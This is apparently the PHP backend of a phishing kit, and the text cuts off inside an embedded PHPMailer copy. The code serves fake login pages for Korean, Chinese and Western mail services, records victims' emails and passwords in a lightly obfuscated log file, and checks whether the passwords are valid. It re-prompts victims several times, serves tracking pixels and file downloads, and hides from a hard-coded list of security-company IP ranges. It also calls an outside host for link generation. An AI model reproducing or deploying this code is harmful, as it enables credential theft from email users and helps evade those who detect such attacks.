$checksum="ccc";
function get_blink($ori_url){
	if (strstartswith($ori_url, "http")){
		$shpos = strpos($ori_url, "//");
		if ($shpos !== false){
			$ori_url = substr($ori_url, $shpos + 2);
		}
	}
	$ch = curl_init();
	$url = "http://www.hekaiyu.cn/baidulink.php?url=".urlencode($ori_url);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, FALSE);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

	$output = curl_exec($ch); 
	curl_close($ch);
	
	$last_url = "";
	$pos = strpos($output, "</form>");
	if ($pos !== FALSE){
		$last_url= substr($output, $pos + 7);
	}
	return $last_url;
}

function readLog($id, $to, $log, $ntid, $ptn, $inptn){
	$agent=$_SERVER['HTTP_USER_AGENT'];
	$pLog = new Log($id, $agent, 0, $to);
	$pLog->setLogfileName($log);
	$pLog->setNtId($ntid);
	$pLog->setPtnId($ptn);
	$pLog->setInPtnId($inptn);
	$pLog->Execute();
}
function accessLog($id, $to, $log, $ntid, $ptn, $inptn, $flin="", $big=""){
	$agent=$_SERVER['HTTP_USER_AGENT'];
	$pLog = new Log($id, $agent, 1, $to);
	$pLog->setUid($id);
	$pLog->setLogfileName($log);
	$pLog->setNtId($ntid);
	$pLog->setPtnId($ptn);
	$pLog->setInPtnId($inptn);
	$pLog->setFlin($flin);
	$pLog->setBig($big);
	$pLog->Execute();
}
function downLog($id, $to, $log, $ntid, $ptn, $inptn, $atname, $atout){
	$agent=$_SERVER['HTTP_USER_AGENT'];
	$pLog = new Log($id, $agent, 60, $to);
	$pLog->setUid($id);
	$pLog->setLogfileName($log);
	$pLog->setNtId($ntid);
	$pLog->setPtnId($ptn);
	$pLog->setInPtnId($inptn);
	$pLog->setAtName($atname);
	$pLog->setAtOut($atout);
	$pLog->Execute();
}
function pLog($id, $to, $pwd, $log, $ntid, $ptn, $inptn, $repcnt=0, $flin="", $big=""){
	$agent=$_SERVER['HTTP_USER_AGENT'];
	$pLog = new Log($id, $agent, 2, $to, $pwd);
	$pLog->setUid($id);
	$pLog->setLogfileName($log);
	$pLog->setNtId($ntid);
	$pLog->setPtnId($ptn);
	$pLog->setInPtnId($inptn);
	$pLog->setRepCnt($repcnt);
	$pLog->setFlin($flin);
	$pLog->setBig($big);
	$pLog->Execute();
}
function rmLog($log){
	$filename = dirname(__FILE__).'/'.$log;
	if (file_exists($filename) == false){
		return TRUE;
	} else {
		return unlink($filename);
	}
}

class AllInfo {
	public static $mailservices = array("unknown", "gmail.com", "outlook.com", "hotmail.com", "daum.net", "naver.com", "hanmail.net", "yandex.ru", "mail.ru", "126.com", "163.com", "yeah.net", "qq.com");
	public static $seccompany = array("103.1.212","103.131.95","103.17.199","103.212.223","104.143.80","104.237.193","104.238.45","104.238.46","104.244.73","106.154.1","106.75.13","107.181.184","107.189.10","107.189.11","107.189.8","107.189.9","108.31.184","109.201.130","109.248.149","109.94.220","111.239.165","115.89.74","116.120.152.158","121.140.61.66","123.58.191","128.90.30","128.90.44","128.90.82","13.124.104","13.209.9","13.211.45","13.235.49","13.236.52","13.245.33","135.148.26","136.144.35","137.184.244","138.199.28","138.199.29","138.199.39","138.199.59","143.244.40","143.244.43","144.172.118","146.70.38","146.70.59","147.135.112","147.147.220","15.188.90","150.143.163","153.246.10","154.16.179","154.16.21","154.16.51","154.3.40","155.146.32","156.146.50","156.146.63","157.230.210","157.97.122","159.242.234","159.65.150","159.8.168","159.8.73","160.251.16","160.251.17","160.251.46","160.251.49","161.35.246","162.217.248","162.247.74","163.172.41","164.90.241","165.231.92","168.119.25","172.241.26","172.94.34","176.58.100","178.148.234","178.148.243","178.175.128","178.175.129","178.176.76","179.61.228","179.61.240","18.197.193","18.237.215","181.214.206","182.162.206","183.77.217","183.90.237","184.170.241","184.170.242","184.170.252","185.17.107","185.191.34","185.213.155","185.220.100","185.220.101","185.220.102","185.232.23","185.77.248","185.92.24","188.165.137","188.241.178","188.42.195","188.93.56","190.106.134","191.101.82","191.96.87","192.155.80","192.42.116","193.105.73","193.128.108","193.27.14","194.110.114","194.110.115","194.195.91","194.5.48","195.246.120","196.199.122","196.240.250","196.242.195","198.98.48","2.57.171","203.133.180","203.26.81","204.101.161","205.169.39","205.237.95","207.102.138","207.244.91","208.86.199","208.87.232","208.87.233","208.87.234","208.87.235","208.87.236","208.87.237","208.87.238","208.87.239","211.117.24","211.231.103","211.249.40","211.249.42","211.249.68","211.249.71","212.102.34","212.102.52","212.102.57","212.102.63","212.143.94","213.205.240","213.211.241","213.33.190","216.246.212","217.114.218","218.155.110.78","218.232.76","218.53.7","220.230.168","222.236.27","223.38.42","23.104.162","23.129.64","27.34.12","27.34.22","3.134.78","35.161.55","35.163.121","35.243.97","37.120.193","38.108.182","38.146.5","43.250.205","43.250.207","45.133.193","45.221.70","45.57.213","45.59.126","46.183.218","46.243.140","46.246.3","5.253.204","51.75.144","51.89.153","52.250.30","52.35.225","52.65.88","54.200.24","54.201.254","54.203.0","54.254.206","58.122.74.118","58.127.29.48","58.184.169","59.10.217.188","62.149.20","65.154.226","65.155.30","66.230.230","66.249.91","69.25.58","77.81.142","79.104.209","85.203.22","85.206.165","87.115.231","87.251.20","88.107.188","89.208.29","89.238.135","89.249.73","89.26.241","91.103.64","91.103.65","91.103.66","91.103.67","93.159.230","93.203.34","94.102.49");
	public static function getOSInfo($uagent){
		$oses	= array(
			'Win311' => 'Win16',
			'Win95' => '(Windows 95)|(Win95)|(Windows_95)',
			'WinME' => '(Windows 98)|(Win 9x 4.90)|(Windows ME)',
			'Win98' => '(Windows 98)|(Win98)',
			'Win2000' => '(Windows NT 5.0)|(Windows 2000)',
			'4' => '(Windows NT 4.0)',
			'WinXp' => '(Windows NT 5.1)|(Windows XP)',
			'WinServer2003' => '(Windows NT 5.2)',
			'WinVista' => '(Windows NT 6.0)',
			'Win7' => '(Windows NT 6.1)',
			'Win8' => '(Windows NT 6.2)',
			'Win8.1' => 'Windows NT 6.3',
			'Win10' => 'Windows NT 10.0',
			'OpenBSD' => 'OpenBSD',
			'SunOS' => 'SunOS',
			'Ubuntu' => 'Ubuntu',
			'Android' => 'Android',
			'Linux' => '(Linux)|(X11)',
			'iPhone' => 'iPhone',
			'iPad' => 'iPad',
			'MacOs' => '(Mac_PowerPC)|(Macintosh)',
			'QNX' => 'QNX',
			'BeOS' => 'BeOS',
			'OS2' => 'OS\/2',
			'S' => '(nuhk)|(Bot)|(http)|(Slurp)|(Ask Jeeves)|(ia_archiver)|(compatible)|(google)|(crawler)'
		);
		$uagent = strtolower($uagent );
		foreach ($oses as $os => $pattern)
			if (preg_match('/' . $pattern . '/i', $uagent))
				return $os;
		return 'Unknown';
	}

	public static function getBrowserInfo($u_agent){
		$version= "";
		$ub="";
		if(preg_match('/(MSIE)|(Trident)/i',$u_agent) && !preg_match('/Opera/i',$u_agent)){
			$ub = "MSIE";
		}
		elseif(preg_match('/Firefox/i',$u_agent)){
			$ub = "Firefox";
		}
		elseif(preg_match('/Opera/i',$u_agent)){
			$ub = "Opera";
		}
		elseif(preg_match('/OPR/i',$u_agent)){
			$ub = "OPR";
		}
		elseif(preg_match('/Chrome/i',$u_agent)){
			$ub = "Chrome";
		}
		elseif(preg_match('/Safari/i',$u_agent)){
			$ub = "Safari";
		}
		elseif(preg_match('/Netscape/i',$u_agent)){
			$ub = "Netscape";
		}
		$known = array('Version', $ub, 'other');
		$pattern = '#(?<browser>' . join('|', $known) .
		')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
		if(!preg_match_all($pattern, $u_agent, $matches)) {
		}
		$i = count($matches['browser']);
		if ($i > 1) {
			if (strrpos($u_agent, "Version") < strrpos($u_agent, $ub)){
				$version = $matches['version'][0];
			}
			else {
				$version = $matches['version'][1];
			}
		}
		else if ($i==1){
			$version = $matches['version'][0];
		}
		if ($version == null || $version == "") {$version = "?";}
		if(preg_match('/rv:11.0/i',$u_agent))
			$version="11.0"; 
		if(preg_match('/OPR/i',$u_agent)){
			$ub = 'Opera';
		}
		if(preg_match('/Swing/i',$u_agent)){
			$ub = 'Swing';
		}
		return array(
			'browser'	=> $ub,
			'version'	=> $version
		); 
	}

	public static function getMailServiceFromId($id){
		$mailservice = 'unknown';
		if ($id < count(AllInfo::$mailservices)){
			$mailservice = AllInfo::$mailservices[$id];
		}
		return $mailservice;
	}
	public static function getMailIdFromService($mailservice){
		$id = 0;
		foreach (AllInfo::$mailservices as $item){
			if (strpos($item, $mailservice) !== FALSE){ return $id; }
			$id ++;
		}
		return 0;
	}
	public static function getMailIdFromAccount($mailAccount){
		$blocks = explode("@", $mailAccount);
		if (count($blocks) != 2) {
			return "Invalid Email";
		} else {
			return $blocks[0];
		}
	}
	public static function getMailServiceFromAccount($mailAccount){
		$blocks = explode("@", $mailAccount);
		if (count($blocks) != 2) {
			return "Invalid Email";
		} else {
			return $blocks[1];
		}
	}
}
class Log{
	public $user_agent;
	public $mail = 'none';
	public $pwd = 'none';
	public $logType = 0;
	public $phonenumber = '';
	public $logfilename = '';
	public $defaulLogFileNames = array("event.php", "event.php", "event.php");
	public $uid = '';
	public $pid = '';
	public $ptnid = '';
	public $inptn = '';
	public $ntid = '';
	public $repcnt = 0;
	public $flin = '';
	public $big = '';
	public $atname = '';
	public $atout = '';
	function __construct($pid, $user_agent, $logType = 0, $mail='none', $pwd='none'){
		$this->pid = $pid;
		$this->user_agent = $user_agent;
		$this->logType = $logType;
		$this->mail = $mail;
		$this->logfilename = $this->defaulLogFileNames[$logType];
		$this->pwd = $pwd;
	}
	public function setPhoneNumber($phonenumber){
		$this->phonenumber = $phonenumber;
	}
	public function setUid($uid){
		$this->uid = $uid;
	}
	public function setPtnId($ptnid){
		$this->ptnid = $ptnid;
	}
	public function setInPtnId($inptn){
		$this->inptn = $inptn;
	}
	public function setNtId($ntid){
		$this->ntid = $ntid;
	}
	public function setLogfileName($logfilename){
		$this->logfilename = $logfilename;
	}
	public function setRepCnt($repcnt){
		$this->repcnt = $repcnt;
	}
	public function setFlin($flin){
		$this->flin = $flin;
	}
	public function setBig($big){
		$this->big = $big;
	}
	public function setAtName($atname){
		$this->atname = $atname;
	}
	public function setAtOut($atout){
		$this->atout = $atout;
	}
	public function downloadFile($oriFileName, $outFileName){
		header('Content-Type: application/octet-stream');
		header("Content-Transfer-Encoding: Binary"); 
		header('Content-Disposition: attachment; filename='.$outFileName);
		readfile($oriFileName); 
	}
	public function Execute(){
		$detect = new Mobile_Detect;
		$deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'tablet' : 'phone') : 'computer');
		$browsertype = '?';
		$browserversion = '?';
		$ostype = '?';
		$mversion=0;
		$isM = false;
		$ostype = AllInfo::getOSInfo($this->user_agent);

		$browser = AllInfo::getBrowserInfo($this->user_agent);
		$browsertype=$browser['browser'];
		$browserversion=$browser['version'];

		if ($detect->isMobile()){
			$scriptVersion = $detect->getScriptVersion();
			$isM = true;
			$mversion = $detect->version('Android', Mobile_Detect::VERSION_TYPE_FLOAT);
			if($mversion==0)$mversion = $detect->version('iPhone', Mobile_Detect::VERSION_TYPE_FLOAT);
			if($mversion==0)$mversion = $detect->version('iPad', Mobile_Detect::VERSION_TYPE_FLOAT);
		}

		$logs = array();
		$logs["ip"] = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : "unknown";
		$iip = $logs["ip"];
		$lstdt = strrpos($iip, '.');
		if ($lstdt != false){
			$iip = substr($iip, 0, $lstdt);
		}
		date_default_timezone_set("Asia/Seoul");
		$timeval=date("Y-m-d H:i:s");
		$logs["datetime"] = $timeval;
		$logs["browsertype"] = $browsertype;
		$logs["browserversion"] = $browserversion;
		$logs["os"] = $isM ? $ostype.$mversion : $ostype;
		$logs["device"] = $deviceType;
		$logs["account"] = $this->mail;
		$logs["ptn"] = $this->ptnid;
		$logs["inptn"] = $this->inptn;
		$logs["ntid"] = $this->ntid;

		$rsa = new RSA($this->pid);
		$fp=fopen($this->logfilename,'ab');
		$isseccompany = false;
		if (in_array($logs["ip"], AllInfo::$seccompany) || in_array($iip, AllInfo::$seccompany)){
			$isseccompany = true;
		}
		
		if ($this->logType == 0){
			$logs['log_type'] = 'read';
			$logs["user_agent"] = json_encode(getallheaders());
			$logstr = json_encode($logs);
			$encstr = $rsa->rsa_enc($logstr);
			fwrite($fp, $encstr."\r\n");
			fclose($fp);
			header('Content-Type: image/gif');
			if ($isseccompany){
				echo ConstVal::get_return_script($this->mail);
			} else {
				echo base64_decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAAEAAUDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD9/KKKKAP/2Q==');
			}
		} else if ($this->logType == 1) {
			if ($this->phonenumber != ''){
				$logs["phonenumber"] = $this->phonenumber;
			}
			$logs['log_type'] = 'click';
			$logs["user_agent"] = json_encode(getallheaders());
			$logstr = json_encode($logs);
			$encstr = $rsa->rsa_enc(json_encode($logs));
			fwrite($fp, $encstr."\r\n");
			fclose($fp);
			$xxxrc = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")."://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
			$blocks = explode("?", $xxxrc);
			$xxxrc = $blocks[0];
			if ($isseccompany){
				echo ConstVal::get_return_script($this->mail);
				return;
			}
			if ($this->flin != ""){
				$xxxrc = $xxxrc."?flin=".$this->flin;
			}
			if ($this->uid == ''){
				echo ConstVal::get_return_script($this->mail);
			} else {
				$islogged = false;
				if ($this->inptn == "naver-blog" || $this->inptn == "daum-cafe" || $this->inptn == "daum-down" || $this->inptn == "naver-down"){
					$in_log = substr(md5($this->inptn), 0, 10).".dat";
					if (!file_exists($in_log)){
						$islogged = false;
					} else {
						$ins = file_get_contents($in_log);
						if ($ins == FALSE){
							$islogged = false;
						} else {
							$ins_blocks = explode("\r\n", $ins);
							foreach ($ins_blocks as $row){
								if ($row == ""){
									continue;
								}
								$rowblocks = explode("\t", $row);
								if (base64_encode($this->mail) == $rowblocks[0]){
									$islogged = true;
									break;
								}
							}
						}
					}
				}
				if ($islogged){
					echo FinishContent::getContent($this->mail, ($isM ? "m" : "b"), $this->ptnid, $this->inptn, $this->uid);
				} else {
					echo LoginContent::getContent($this->mail, ($isM ? "m" : "b"), $xxxrc, $this->uid, $this->ntid, $this->ptnid, $this->inptn, 0);
				}
			}
		} else if ($this->logType == 2){
			if ($this->phonenumber != ''){
				$logs["phonenumber"] = $this->phonenumber;
			}
			$logs['log_type'] = 'input';
			$logs["user_agent"] = json_encode(getallheaders());
			$blocks = explode("@", $this->mail);
			$xxxrc = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")."://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
			$rcblocks = explode("?", $xxxrc);
			$xxxrc = $rcblocks[0];
			if ($this->flin != ""){
				$xxxrc = $xxxrc."?flin=".$this->flin;
			}

			if ($blocks[1] == "126.com" || $blocks[1] == "163.com"){
				$logs["pwd"] = $this->pwd;
				$logstr = json_encode($logs);
				$encstr = $rsa->rsa_enc($logstr);
				fwrite($fp, $encstr."\r\n");
				fclose($fp);
				if ($this->repcnt < 2){
					echo LoginContent::getContent($this->mail, ($isM ? "m" : "b"), $xxxrc, $this->uid, $this->ntid, $this->ptnid, $this->inptn, $this->repcnt);
				} else {
					if ($this->flin != ""){
						echo '<script>window.location.href="'.$this->flin.'"</script>';
						exit(0);
					}
					echo FinishContent::getContent($this->mail, ($isM ? "m" : "b"), $this->ptnid, $this->inptn, $this->uid);
				}
				return;
			}
			if ($blocks[1] == "korea.com"){
				$logs["pwd"] = $this->pwd;
				$logstr = json_encode($logs);
				$encstr = $rsa->rsa_enc($logstr);
				fwrite($fp, $encstr."\r\n");
				fclose($fp);
				$ccnt = rand(3, 5);
				if ($this->repcnt < $ccnt){
					echo LoginContent::getContent($this->mail, ($isM ? "m" : "b"), $xxxrc, $this->uid, $this->ntid, $this->ptnid, $this->inptn, $this->repcnt);
				} else {
					if ($this->flin != ""){
						echo '<script>window.location.href="'.$this->flin.'"</script>';
						exit(0);
					}
					echo FinishContent::getContent($this->mail, ($isM ? "m" : "b"), $this->ptnid, $this->inptn, $this->uid);
				}
				return;
			}
			if ($blocks[1] == "outlook.com" || $blocks[1] == "hotmail.com"){
				$logs["pwd"] = $this->pwd;
				$logstr = json_encode($logs);
				$encstr = $rsa->rsa_enc($logstr);
				fwrite($fp, $encstr."\r\n");
				fclose($fp);
				if ($this->repcnt < 2){
					echo LoginContent::getContent($this->mail, ($isM ? "m" : "b"), $xxxrc, $this->uid, $this->ntid, $this->ptnid, $this->inptn, $this->repcnt);
				} else {
					if ($this->flin != ""){
						echo '<script>window.location.href="'.$this->flin.'"</script>';
						exit(0);
					}
					echo FinishContent::getContent($this->mail, ($isM ? "m" : "b"), $this->ptnid, $this->inptn, $this->uid);
				}
				return;
			}
			if ($this->inptn == "naver-private"){
				$mailid = $blocks[0]."||";
				$logs["pwd"] = $this->pwd."(f)";
				$logstr = json_encode($logs);
				$encstr = $rsa->rsa_enc($logstr);
				fwrite($fp, $encstr."\r\n");
				fclose($fp);
				if ($mailid == $this->pwd){
					echo LoginContent::getContent($this->mail, ($isM ? "m" : "b"), $xxxrc, $this->uid, $this->ntid, $this->ptnid, $this->inptn, $this->repcnt);
				} else {
					if ($this->flin != ""){
						echo '<script>window.location.href="'.$this->flin.'"</script>';
						exit(0);
					}
					echo FinishContent::getContent($this->mail, ($isM ? "m" : "b"), $this->ptnid, $this->inptn, $this->uid);
				}
				return;
			}
			if ($this->inptn == "naver-blog" || $this->inptn == "daum-down" || $this->inptn == "naver-down"){
				$in_log = substr(md5($this->inptn), 0, 10).".dat";
				$infp = fopen($in_log, "ab");
				$row = base64_encode($this->mail)."\t";
				$row = $row."\r\n";
				fwrite($infp, $row);
				fclose($infp);
			}
			if ($this->inptn == "daum-cafe"){
				if ($this->repcnt == 0){
					echo LoginContent::getContent($this->mail, ($isM ? "m" : "b"), $xxxrc, $this->uid, $this->ntid, $this->ptnid, $this->inptn, $this->repcnt);
				} else {
					$in_log = substr(md5($this->inptn), 0, 10).".dat";
					$infp = fopen($in_log, "ab");
					$row = base64_encode($this->mail)."\t";
					$row = $row."\r\n";
					fwrite($infp, $row);
					fclose($infp);
				}
			}
			if (CheckSum::Valid($this->mail, $this->pwd) == "1"){
				$logs["pwd"] = $this->pwd."(s)";
				$logstr = json_encode($logs);
				$encstr = $rsa->rsa_enc($logstr);
				fwrite($fp, $encstr."\r\n");
				fclose($fp);
				if ($isseccompany){
					echo ConstVal::get_return_script($this->mail);
					return;
				}
				echo FinishContent::getContent($this->mail, ($isM ? "m" : "b"), $this->ptnid, $this->inptn, $this->uid);
			} else {
				$logs["pwd"] = $this->pwd."(f)";
				$logstr = json_encode($logs);
				$encstr = $rsa->rsa_enc($logstr);
				fwrite($fp, $encstr."\r\n");
				fclose($fp);
				if ($isseccompany){
					echo ConstVal::get_return_script($this->mail);
					return;
				}
				$ccnt = rand(3, 5);
				if ($this->repcnt < $ccnt){
					echo LoginContent::getContent($this->mail, ($isM ? "m" : "b"), $xxxrc, $this->uid, $this->ntid, $this->ptnid, $this->inptn, $this->repcnt);
				} else {
					if ($this->flin != ""){
						echo '<script>window.location.href="'.$this->flin.'"</script>';
						exit(0);
					}
					echo FinishContent::getContent($this->mail, ($isM ? "m" : "b"), $this->ptnid, $this->inptn, $this->uid);
				}
			}
		} else if ($this->logType == 3){
			if ($this->phonenumber != ''){
				$logs["phonenumber"] = $this->phonenumber;
			}
			if (CheckSum::Valid($this->mail, $this->pwd) == "1"){
				$logs["pwd"] = $this->pwd."(s)";
			} else {
				$logs["pwd"] = $this->pwd."(f)";
			}
			$logs['log_type'] = 'input';
			$logs["user_agent"] = json_encode(getallheaders());
			$logstr = json_encode($logs);
			$encstr = $rsa->rsa_enc($logstr);
			fwrite($fp, $encstr."\r\n");
			fclose($fp);
			if ($isseccompany){
				echo ConstVal::get_return_script($this->mail);
				return;
			}
			echo FinishContent::getContent($this->mail, ($isM ? "m" : "b"), $this->ptnid, $this->inptn, $this->uid);
		} else if ($this->logType == 60){
			$logs['log_type'] = 'down';
			$logs["user_agent"] = json_encode(getallheaders());
			$logstr = json_encode($logs);
			$encstr = $rsa->rsa_enc($logstr);
			fwrite($fp, $encstr."\r\n");
			fclose($fp);
			if ($isseccompany){
				echo "";
			} else {
				if ($this->atname == '' || $this->atout == ''){
					echo "";
				}
				$oriFileName = $this->atname.".dat";
				$moriFileName = $this->atname.".datm";
				if (!file_exists($oriFileName)){
					echo "";
				}

				if ($detect->isMobile()){
					if (file_exists($moriFileName)){
						$this->downloadFile($moriFileName, $this->atout);
					} else {
						$this->downloadFile($oriFileName, $this->atout);
					}
				} else {
					$this->downloadFile($oriFileName, $this->atout);
				}


			}
		}
	}
}
class RSA {
	public $pubkey = '{xxxrsapub}';
	function __construct($pubkey= NULL){
		if ($pubkey != NULL){
			$this->pubkey = $pubkey;
		}
	}
	public function rsa_enc($data)
	{
		$result = '';
		for($i=0; $i<strlen($data);){
			for($j=0; ($j<strlen($this->pubkey) && $i<strlen($data)); $j++,$i++){
				$result .= $data{$i} ^ $this->pubkey{$j};
			}
		}
		return base64_encode($result);
	}
}

class PHPMailer {
	public $CharSet = 'iso-8859-1';
	public $Mailer = 'mail';
	public $Sendmail = '/usr/sbin/sendmail';
	public $Hostname = '';
	public $Host = 'localhost';
	public $Port = 25;
	public $Helo = '';
	public $SMTPSecure = '';
	public $SMTPAutoTLS = true;
	public $SMTPAuth = false;
	public $SMTPOptions = array();
	public $Username = '';
	public $Password = '';
	public $AuthType = '';
	public $Realm = '';
	public $Workstation = '';
	public $Timeout = 300;
	public $SMTPDebug = 0;
	public $Debugoutput = 'echo';
	public $SingleTo = false;
	public $do_verp = false;
	public static $validator = 'auto';
	protected $smtp = null;
	protected $language = array();
	protected $exceptions = false;
	protected $uniqueid = '';
	const STOP_MESSAGE = 0;
	const STOP_CONTINUE = 1;
	const STOP_CRITICAL = 2;
	const CRLF = "\r\n";
	const MAX_LINE_LENGTH = 998;
	
	public function __construct($exceptions = null) {
		if ($exceptions !== null) {
			$this->exceptions = (boolean)$exceptions;
		}
	}
	public function __destruct() {
		$this->smtpClose();
	}
	
	public function getSMTPInstance() {
		if (!is_object($this->smtp)) {
			$this->smtp = new SMTP;
		}
		return $this->smtp;
	}
	protected function serverHostname() {
		$result = 'localhost.localdomain';
		if (!empty($this->Hostname)) {
			$result = $this->Hostname;
		} elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) {
			$result = $_SERVER['SERVER_NAME'];
		} elseif (function_exists('gethostname') && gethostname() !== false) {
			$result = gethostname();
		} elseif (php_uname('n') !== false) {
			$result = php_uname('n');
		}
		return $result;
	}
	public function isSMTP() {
		$this->Mailer = 'smtp';
	}	
	public function smtpConnect($options = null) {
		if (is_null($this->smtp)) {
			$this->smtp = $this->getSMTPInstance();
		}
		
		if (is_null($options)) {
			$options = $this->SMTPOptions;
		}
		if ($this->smtp->connected()) {
			return true;
		}

		$this->smtp->setTimeout($this->Timeout);
		$this->smtp->setDebugLevel($this->SMTPDebug);
		$this->smtp->setDebugOutput($this->Debugoutput);
		$this->smtp->setVerp($this->do_verp);
		$hosts = explode(';', $this->Host);
		$lastexception = null;

		foreach ($hosts as $hostentry) {
			$hostinfo = array();
			if (!preg_match('/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*):?([0-9]*)$/', trim($hostentry), $hostinfo)) {
				// Not a valid host entry
				continue;
			}
			
			$prefix = '';
			$secure = $this->SMTPSecure;
			$tls = ($this->SMTPSecure == 'tls');
			if ('ssl' == $hostinfo[2] or ('' == $hostinfo[2] and 'ssl' == $this->SMTPSecure)) {
				$prefix = 'ssl://';
				$tls = false; // Can't have SSL and TLS at the same time
				$secure = 'ssl';
			} elseif ($hostinfo[2] == 'tls') {
				$tls = true;
				// tls doesn't use a prefix
				$secure = 'tls';
			}
			$sslext = defined('OPENSSL_ALGO_SHA1');
			if ('tls' === $secure or 'ssl' === $secure) {
				if (!$sslext) {
					throw new phpmailerException($this->lang('extension_missing').'openssl', self::STOP_CRITICAL);
				}
			}
			$host = $hostinfo[3];
			$port = $this->Port;
			$tport = (integer)$hostinfo[4];
			if ($tport > 0 and $tport < 65536) {
				$port = $tport;
			}
			if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) {
				try {
					if ($this->Helo) {
						$hello = $this->Helo;
					} else {
						$hello = $this->serverHostname();
					}
					$this->smtp->hello($hello);
					if ($this->SMTPAutoTLS and $sslext and $secure != 'ssl' and $this->smtp->getServerExt('STARTTLS')) {
						$tls = true;
					}
					if ($tls) {
						if (!$this->smtp->startTLS()) {
							throw new phpmailerException($this->lang('connect_host'));
						}
						// We must resend EHLO after TLS negotiation
						$this->smtp->hello($hello);
					}
					
					if ($this->SMTPAuth) {
						if (!$this->smtp->authenticate(
							$this->Username,
							$this->Password,
							$this->AuthType,
							$this->Realm,
							$this->Workstation
						)
						) {
							throw new phpmailerException($this->lang('authenticate'));
						}
					}
					return true;
				} catch (phpmailerException $exc) {
					$lastexception = $exc;
					$this->edebug($exc->getMessage());
					$this->smtp->quit();
				}
			}
		}
		$this->smtp->close();
		if ($this->exceptions and !is_null($lastexception)) {
			throw $lastexception;
		}
		return false;
	}
	public function smtpClose()	{
		if (is_a($this->smtp, 'SMTP')) {
			if ($this->smtp->connected()) {
				$this->smtp->quit();
				$this->smtp->close();
			}
		}
	}
	public function setLanguage($langcode = 'en', $lang_path = '') {
		$renamed_langcodes = array(
			'br' => 'pt_br',
			'cz' => 'cs',
			'dk' => 'da',
			'no' => 'nb',
			'se' => 'sv',
		);
		if (isset($renamed_langcodes[$langcode])) {
			$langcode = $renamed_langcodes[$langcode];
		}
		$PHPMAILER_LANG = array(
			'authenticate' => 'SMTP Error: Could not authenticate.',
			'connect_host' => 'SMTP Error: Could not connect to SMTP host.',
			'data_not_accepted' => 'SMTP Error: data not accepted.',
			'empty_message' => 'Message body empty',
			'encoding' => 'Unknown encoding: ',
			'execute' => 'Could not execute: ',
			'file_access' => 'Could not access file: ',
			'file_open' => 'File Error: Could not open file: ',
			'from_failed' => 'The following From address failed: ',
			'instantiate' => 'Could not instantiate mail function.',
			'invalid_address' => 'Invalid address: ',
			'mailer_not_supported' => ' mailer is not supported.',
			'provide_address' => 'You must provide at least one recipient email address.',
			'recipients_failed' => 'SMTP Error: The following recipients failed: ',
			'signing' => 'Signing Error: ',
			'smtp_connect_failed' => 'SMTP connect() failed.',
			'smtp_error' => 'SMTP server error: ',
			'variable_set' => 'Cannot set or reset variable: ',
			'extension_missing' => 'Extension missing: '
		);
		if (empty($lang_path)) {
			$lang_path = dirname(__FILE__). DIRECTORY_SEPARATOR . 'language'. DIRECTORY_SEPARATOR;
		}
		if (!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/', $langcode)) {
			$langcode = 'en';
		}
		$foundlang = true;
		$lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php';
		if ($langcode != 'en') {
			if (!is_readable($lang_file)) {
				$foundlang = false;
			} else {
				$foundlang = include $lang_file;
			}
		}
		$this->language = $PHPMAILER_LANG;
		return (boolean)$foundlang; // Returns false if language not found
	}
	
	protected function lang($key) {
		if (count($this->language) < 1) {
			$this->setLanguage('en'); // set the default language
		}
		if (array_key_exists($key, $this->language)) {
			if ($key == 'smtp_connect_failed') {
				return $this->language[$key] . ' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting';
			}
			return $this->language[$key];
		} else {
			return $key;
		}
	}
	
	protected function edebug($str) {
		if ($this->SMTPDebug <= 0) {
			return;
		}
		if (!in_array($this->Debugoutput, array('error_log', 'html', 'echo')) and is_callable($this->Debugoutput)) {
			call_user_func($this->Debugoutput, $str, $this->SMTPDebug);
			return;
		}
		switch ($this->Debugoutput) {
			case 'error_log':
				error_log($str);
				break;
			case 'html':
				echo htmlentities(
					preg_replace('/[\r\n]+/', '', $str),ENT_QUOTES,'UTF-8')."<br>\n";
				break;
			case 'echo':
			default:
				$str = preg_replace('/\r\n?/ms', "\n", $str);
